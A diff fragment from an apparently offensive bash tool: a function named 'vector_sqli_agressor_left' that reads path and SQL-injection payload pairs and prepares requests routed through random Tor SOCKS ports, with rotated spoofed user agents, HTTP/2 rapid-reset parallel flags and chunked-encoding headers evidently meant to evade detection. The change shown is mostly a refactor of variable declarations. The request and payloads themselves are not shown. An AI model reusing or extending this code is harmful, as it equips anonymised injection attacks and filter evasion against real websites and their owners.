@@ -136,23 +136,32 @@ dork() {
   fi
 }    
     # 1st Vector func.
-    vector_sqli_agressor_left() {
+   vector_sqli_agressor_left() {
       while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
         if [[ "$default_path" == "/" ]]; then
           default_path=""
         fi
-        local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
-          local current_time=$(date +%H:%M:%S)         
-          local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"         
+        
+        local random_port
+        random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
+        
+        local current_time
+        current_time=$(date +%H:%M:%S)         
+        
+        local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"         
 
-          local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
-          local random_ua="$base_ua"
-          local ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+        local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
+        local random_ua="$base_ua"
+        
+        local ua_salt
+        ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 
-          local target_cipher=""
-          local target_tls13=""
-          local rapid_reset_args="--http2 --parallel --parallel-max 50"
-          local chunked_headers="-H \"Transfer-Encoding: chunked\" -H \"Content-Type: application/x-www-form-urlencoded\""
+        local target_cipher=""
+        local target_tls13=""
+        local rapid_reset_args="--http2 --parallel --parallel-max 50"
+        
+        local chunked_headers
+        chunked_headers=(-H "Transfer-Encoding: chunked" -H "Content-Type: application/x-www-form-urlencoded")
           if [[ "$base_ua" == *"Firefox"* ]]; then
 
             random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
